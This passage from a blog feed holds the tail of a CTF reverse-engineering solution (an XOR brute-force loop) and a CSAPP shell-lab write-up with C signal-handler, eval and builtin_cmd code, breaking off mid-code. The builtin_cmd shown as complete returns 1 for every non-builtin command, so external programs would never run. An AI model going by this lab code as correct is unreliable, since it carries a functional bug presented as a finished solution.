class="number">33</span>;tmp&lt;<span class="number">128</span>;tmp++)</span><br><span class="line">        &#123;</span><br><span class="line">            v9=arr[key1][key2]^tmp;</span><br><span class="line">            <span class="keyword">if</span>(v9==input[v5])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,tmp);</span><br><span class="line">                <span class="keyword">goto</span> lab1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v9=arr[key1][key2]^input[v5];</span><br><span class="line"> lab1:  key1=(v9+key1)%<span class="number">299</span>;</span><br><span class="line">        key2=(v9+key2)%<span class="number">300</span>;</span><br><span class="line">        <span class="comment">//com[v5]=v9;</span></span><br><span class="line">        ++v5;</span><br><span class="line">    &#125;<span class="keyword">while</span>(v5&lt;v6);</span><br></pre></td></tr></table></figure><p>在do while循环里，使用一个tmp进行尝试，如果他异或得到的数字和阿狸给出的数字相同则说明他就是我们要求的那个字符，将其打印出来。最后进行一下base64</p><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230928171641.png"></p><p>后面就是misc部分了，纯靠猜测。将矩阵转成图片，我的pillow试了很多次总是超时，就搁置了<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230928211949.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;每周做点题目&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>csapp-shlab</title>
    <link href="http://example.com/2023/09/19/csapp-shlab/"/>
    <id>http://example.com/2023/09/19/csapp-shlab/</id>
    <published>2023-09-19T15:41:55.000Z</published>
    <updated>2023-09-19T15:41:55.303Z</updated>
    
    <content type="html"><![CDATA[<p>实现一个简单的shell，光是看官方的pdf就看了半天。</p><p>其实很简单，我们只要完善七个函数就好了，其中三个信号相关的。每次更新我们都要使用make命令编译一下。<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230919172643.png"></p><p>这样就完成了更新。</p><p>一共有七个任务：</p><span id="more"></span><ul><li>eval: Main routine that parses and interprets the command line. [70 lines]</li><li>builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]</li><li>do bgfg: Implements the bg and fg built-in commands. [50 lines]</li><li>waitfg: Waits for a foreground job to complete. [20 lines]</li><li>sigchld handler: Catches SIGCHILD signals. 80 lines]</li><li>sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]</li><li>sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</li></ul><p>中文解释：</p><ul><li>解析和解释命令行的main程序。[70行]</li><li>内置命令：识别和解释内置命令：quit、fg、bg和jobs。[25行]</li><li>执行bgfg：实现bg和fg内置命令。[50行]</li><li>等待前台作业完成：等待前台作业完成。[20行]</li><li>SIGCHLD处理程序：捕获SIGCHILD信号。[80行]</li><li>SIGINT处理程序：捕获SIGINT（ctrl-c）信号。[15行]</li><li>SIGTSTP处理程序：捕获SIGTSTP（ctrl-z）信号。[15行]</li></ul><p>中括号里的行数是预期函数代码。</p><h2 id="信号处理函数"><a href="#信号处理函数" class="headerlink" title="信号处理函数"></a><strong>信号处理函数</strong></h2><p>正如书中所说信号处理是linux系统编程中最棘手的一个问题。</p><p>如何安全的进行信号处理？</p><ul><li>处理程序尽可能简单</li><li>在处理程序中只调用异步信号安全的函数。</li><li>保存和恢复errno。许多Linux异步信号处理程序都会在出错返回时设置errno。在处理程序运行时可能会干扰主程序中其他依赖于errno的部分。解决方法是在进入处理程序时将errno保存到一个局部变量，在处理函数返回前恢复它。如果处理程序用_exit终止该程序，那么就不需要这样做。</li><li>阻塞所有的信号，保护对共享全局数据结构的访问。如果处理程序和主程序或其他处理程序共享一个全局数据结构，那么在访问该数据结构时，处理程序和主程序应该暂时阻塞所有的信号。这条规则的原因是从主程序访问一个数据结构d通常需要一系列指令，如果指令序列被访问d的处理程序中断，那么处理程序可能会发现d的状态不一致，得到不可预知的结果。在访问d时暂时阻塞信号保证了处理程序不会中断该指令序列。</li></ul><h3 id="sigint-handler（✔）"><a href="#sigint-handler（✔）" class="headerlink" title="sigint_handler（✔）"></a><strong>sigint_handler（✔）</strong></h3><p>先来个行数最小的，捕获SIGINT，也就是令cltr-c得到处理。有两点需要注意：1）这个程序不是被_exit终止的，所以我们最好设置一下errno。2）处理程序访问了全局数据jobs，安全起见我们暂时阻塞所有信号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tmp=errno;</span><br><span class="line">    <span class="type">sigset_t</span> <span class="built_in">set</span>,prev_set;</span><br><span class="line">    sigfillset(&amp;<span class="built_in">set</span>);<span class="comment">//将全部信号加入set</span></span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;<span class="built_in">set</span>,&amp;prev_set);<span class="comment">//阻塞全部信号</span></span><br><span class="line">    <span class="comment">//printf(&quot;494:阻塞全部信号\n&quot;);</span></span><br><span class="line">    <span class="type">pid_t</span> pid=fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(pid&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;got SIGINT&quot;);</span></span><br><span class="line">        kill(-pid,SIGINT);<span class="comment">//-pid kill函数发送信号给|pid|进程组的每个进程，起到了将所有的子进程父进程孙进程一网打尽的效果</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;501:恢复全部信号\n&quot;);</span></span><br><span class="line">    sigprocmask(SIG_SETMASK,&amp;prev_set,<span class="literal">NULL</span>);<span class="comment">//恢复</span></span><br><span class="line">    errno=tmp;</span><br><span class="line">    <span class="comment">//printf(&quot;成功退出SIGCHLD处理函数\n&quot;);</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要注意的点就是kill函数第一个参数设置为负数，可以对整个进程组发送信号，防止产生孤儿进程。</p><h3 id="sigtstp-handler（✔）"><a href="#sigtstp-handler（✔）" class="headerlink" title="sigtstp_handler（✔）"></a><strong>sigtstp_handler（✔）</strong></h3><p>SIGSTOP属于不可忽略信号，作用是暂停前台作业。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tmp=errno;</span><br><span class="line"></span><br><span class="line">    <span class="type">sigset_t</span> <span class="built_in">set</span>,prev_all;</span><br><span class="line">    sigfillset(&amp;<span class="built_in">set</span>);<span class="comment">//将全部信号加入set</span></span><br><span class="line">    sigemptyset(&amp;prev_all);</span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;<span class="built_in">set</span>,&amp;prev_all);<span class="comment">//阻塞全部信号</span></span><br><span class="line">    <span class="type">pid_t</span> pid=fgpid(jobs);<span class="comment">//有前台则返回pid，无则返回0</span></span><br><span class="line">    <span class="keyword">if</span>(pid&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        kill(-pid,sig);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);<span class="comment">//恢复</span></span><br><span class="line">    errno=tmp;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sigchld-handler（✔）"><a href="#sigchld-handler（✔）" class="headerlink" title="sigchld_handler（✔）"></a><strong>sigchld_handler</strong>（✔）</h3><p>子进程终止或停止操作系统会向父进程发出SIGCHLD信号。</p><p>先看书中的几个例子。首先是这个例子，调用waitpid并将第一个参数设置为-1，等待集合由父进程的所有子进程组成。</p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914153737.png"></p><p>在只有单一进程的情况下，这种处理方法是没有问题的，可是如果子进程有很多，就会出现丢失信号的情况。因为等待列表里最多只能有一个信号，当接收到SIGCHLD信号的时候，调用处理程序，SIGCHLD信号被阻塞，如果此时传来一个SIGCHLD信号他就会进入等待列表，等第一个信号处理完之后，解除阻塞，触发处理程序，一旦这时候在传来SIGCHLD信号，信号不会进入列表等待，而是直接丢失。要解决这个问题，我们就得明白信号是不会排队等待的。</p><p>下面是解决信号不排队等待问题的方案，设置了一个循环，waitpid函数如果成功等待进程停止就会返回pid&gt;0，进入循环后阻塞全部的信号，删除作业，解除阻塞。</p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914022659.png"></p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914022754.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tmp=errno;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="type">sigset_t</span> mask_all,prev;</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigemptyset(&amp;prev);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>((pid=waitpid(<span class="number">-1</span>,&amp;status,WNOHANG | WUNTRACED))&gt;<span class="number">0</span>)  <span class="comment">//第三个参数代表立即返回，如果等待集合的子进程都没有被停职或终止则返回0，如果有则返回pid</span></span><br><span class="line">    &#123;  <span class="comment">//有子进程停止或终止，判断是停止则更改状态，是终止则删除作业</span></span><br><span class="line">       sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);<span class="comment">//阻塞全部信号</span></span><br><span class="line">       <span class="keyword">if</span>(WIFEXITED(status))</span><br><span class="line">       &#123; <span class="comment">//如果进程是通过exit或return正常终止则返回真，进入语句</span></span><br><span class="line">         deletejob(jobs,pid);<span class="comment">//删除指定pid的作业，pid由waitpid返回得到</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(WIFSIGNALED(status))</span><br><span class="line">       &#123; <span class="comment">//如果子进程是因为一个信号终止的则返回真</span></span><br><span class="line">         <span class="built_in">printf</span> (<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));</span><br><span class="line">         deletejob(jobs, pid);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(WIFSTOPPED(status))</span><br><span class="line">       &#123; <span class="comment">//如果子进程现在是停止的，改变工作状态--&gt;ST</span></span><br><span class="line">           <span class="built_in">printf</span> (<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));</span><br><span class="line">           job = getjobpid(jobs,pid);</span><br><span class="line">           job-&gt;state = ST;</span><br><span class="line">       &#125;</span><br><span class="line">       sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if(errno!=ECHILD)</span></span><br><span class="line">    <span class="comment">//   unix_error(&quot;waitpid error!&quot;);</span></span><br><span class="line">    errno=tmp;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意waitpid的参数设置，这里不再是默认的,而是使用了status和options，status记录进程状态信息，options更改等待子进程的行为。默认情况options是0，等待集合中的任意一个子进程结束，如果集合中有后台进程，那么waitpid函数也会傻傻的等待，直到后台进程执行完毕才会重新弹出&gt;,所以这里设置了参数WNOHANG | WUNTRACED，此时waitpid的行为是立即返回，即不会等待进程停止或结束。</p><h2 id="输入处理函数"><a href="#输入处理函数" class="headerlink" title="输入处理函数"></a><strong>输入处理函数</strong></h2><h3 id="eval函数（✔）"><a href="#eval函数（✔）" class="headerlink" title="eval函数（✔）"></a><strong>eval函数</strong>（✔）</h3><p>先看一下书上的作为参考<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230912012344.png"></p><p>eval函数在main函数中的调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Execute the shell&#x27;s read/eval loop */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Read command line */</span></span><br><span class="line">    <span class="keyword">if</span> (emit_prompt) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &amp;&amp; ferror(<span class="built_in">stdin</span>))</span><br><span class="line">        app_error(<span class="string">&quot;fgets error&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) &#123; <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Evaluate the command line */</span></span><br><span class="line">    eval(cmdline);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure><p>功能：首先检测第一个命令行参数是否为shll的内置命令（）&#x2F;</p><p>参数是commandline也就是我们的输入</p><p>函数功能：</p><p>接收我们的输入作为参数，如果是内置命令则直接执行，如果不是内置命令，创建一个新的进程调用execve运行程序。</p><p>在标准的Unix shell运行shell时，shell在前台进程组中运行，所以我们用fork创建的子进程也就是我们的前台作业也属于shell的进程组。但是ctrl+c会向前台进程组的每个进程发送SIGINT信号，也就是内核会向shell和shell创建的每个进程，我们使用setpid(0,0),将创建的子进程放到一个引得进程组中，新的进程组ID和PID相同。这样当按下ctrl+c时就只会对shell发送信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span>*cmdline)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>*argv[MAXARGS];</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="type">int</span> bg;</span><br><span class="line">    <span class="type">sigset_t</span> mask,prev,mask_all;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigemptyset(&amp;prev);</span><br><span class="line">    sigaddset(&amp;mask,SIGCHLD);</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buf,cmdline);<span class="comment">//将输入复制到buf</span></span><br><span class="line">    bg=parseline(buf,argv);<span class="comment">//构造参数列表，后台作业返回1，前台返回0</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//非内置命令</span></span><br><span class="line">        sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev);<span class="comment">//阻塞SIGCHLD信号</span></span><br><span class="line">        <span class="comment">//printf(&quot;194:阻塞SIGCHLD信号\n&quot;);//为什么要阻塞sigchld信号？防止子进程结束发出的sigchld信号影响主程序，也就是保证add在delete之前</span></span><br><span class="line">        <span class="keyword">if</span>((pid=fork())==<span class="number">0</span>)<span class="comment">//子进程运行命令,需要阻塞信号避免竞争</span></span><br><span class="line">        &#123;</span><br><span class="line">            setpgid(<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//将子进程放入新的进程组中gpid=pid，可以避免停止时把tsh程序中断</span></span><br><span class="line">            sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);<span class="comment">//恢复子进程信号</span></span><br><span class="line">            <span class="keyword">if</span>(execve(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s:command not found\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//退出子进程</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//父进程,根据前后台添加作业至作业列表</span></span><br><span class="line">        <span class="comment">//printf(&quot;父进程控制&quot;);</span></span><br><span class="line">        <span class="keyword">if</span>(!bg)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;执行了一个前台任务&quot;);</span></span><br><span class="line">            sigprocmask(SIG_BLOCK,&amp;mask_all,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">//printf(&quot;213:阻塞全部信号\n&quot;);</span></span><br><span class="line">            <span class="comment">//printf(&quot;添加前台作业子进程的pid:%d,gpid:%d\n&quot;,pid,getpgid(pid));</span></span><br><span class="line">            addjob(jobs,pid,FG,cmdline);</span><br><span class="line">            waitfg(pid);</span><br><span class="line">            sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//后台作业</span></span><br><span class="line">        &#123;</span><br><span class="line">            sigprocmask(SIG_BLOCK,&amp;mask_all,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">//printf(&quot;225:阻塞全部信号\n&quot;);</span></span><br><span class="line">            <span class="comment">//printf(&quot;添加后台作业：%d\n&quot;,pid);</span></span><br><span class="line">            addjob(jobs,pid,BG,cmdline);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">            sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里比较关键的是<code>setpgid(0,0)</code>，当使用了execve函数开始一个新的进程时，按下ctrl+c不会将我们的tsh程序关闭，因为该函数将新的进程放入了一个新的进程组中，通过键盘发送的信号被tsh进程捕获然后通过kill函数像子进程组发送SIGINT信号就好啦。</p><h3 id="builtun-cmd（✔）"><a href="#builtun-cmd（✔）" class="headerlink" title="builtun_cmd（✔）"></a><strong>builtun_cmd（✔）</strong></h3><p>如果是内置命令（quit、fg、bg、jobs）则直接执行，如果不是则返回0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//退出shell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;fg&quot;</span>)||(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;bg&quot;</span>)))<span class="comment">//fg %jid or fg pid 将一个作业切换至前台运行</span></span><br><span class="line">    &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;jobs&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;&amp;&quot;</span>))<span class="comment">//后台作业</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;command not found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command 不是内置命令*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="waitfg（✔）"><a href="#waitfg（✔）" class="headerlink" title="waitfg（✔）"></a><strong>waitfg（✔）</strong></h3><p>等待前台作业结束，这个参考了书上的代码，也想了很久</p><p>书中建议使用sigsuspend函数进行阻塞，既能解决单独pause引来的竞争问题，又能解决sleep速度太慢的问题。<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913014756.png"></p><p>注意这个向量使用的是prev，该函数的实际作用是：1）将阻塞列表设为prev。2）在捕捉到一个信号之前，该进程被挂起（pause函数）。3）如果捕捉到一个信号而且从处理程序返回则sigsuspend返回，并且将该进程的阻塞列表恢复，如果是终止信号则该进程不从sigsuspend返回直接终止。<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913015040.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span><span class="comment">//linux shell在接收下一个命令之前，必须显示地等待前台作业终止</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">sigset_t</span> mask,prev;</span><br><span class="line">   sigemptyset(&amp;mask);</span><br><span class="line">   sigemptyset(&amp;prev);</span><br><span class="line">   <span class="comment">//等待前台作业传送来的SIGCHLD信号</span></span><br><span class="line">   <span class="keyword">while</span>(fgpid(jobs)!=<span class="number">0</span>)<span class="comment">//fgpid函数返回前台进程pid，如果没与前台进程则返回0</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">//进来循环了，那就说明前台进程还在</span></span><br><span class="line">    sigsuspend(&amp;mask);<span class="comment">//清除阻塞列表，挂起，恢复阻塞列表</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//printf(&quot;暂无前台作业\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="do-bgfg（✔）"><a href="#do-bgfg（✔）" class="headerlink" title="do_bgfg（✔）"></a><strong>do_bgfg</strong>（✔）</h3><p>执行内置的bg函数和fg函数，在builtin_cmd函数中被调用，其参数时命令行参数列表。<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913193002.png"></p><p>在完成这个函数之前我们要认识一下fg命令和bg命令。</p><p>fg是foreground（前台）的缩写，用于将一个在后台的进程切换到前台，并恢复执行</p><ul><li><code>fg</code> 将最近放入后台的进程移动到前台执行</li><li><code>fg %jid</code> 根据jid进行操作</li><li><code>fg pid</code>根据pid进行操作</li></ul><p>bg是background（后台）的缩写，用于将一个暂停的程序放入后台执行。操作和fg相同。</p><p>下面在真正的shell演示一下：</p><p>先来一个<code>sleep 1000</code> 当前进程处于休眠状态，1000秒后返回控制，我们可以将其理解为一个运行中的程序。</p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913194413.png"></p><p>CTRL+Z将其暂停</p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913194627.png"></p><p>jobs查看作业列表</p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913194739.png"></p><p>使用fg命令将其切换到前台并执行</p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913194904.png"></p><p>然后CTRL+z将其暂停，使用bg命令让其在后台运行，jobs查看状态显示running</p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913195034.png"></p><p>无论是fg还是bg都涉及到恢复一个stopped状态的进程，那么如何恢复一个进程？</p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913224612.png"></p><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913224440.png"></p><p>由此可知，我们在这个函数内要调用kill函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 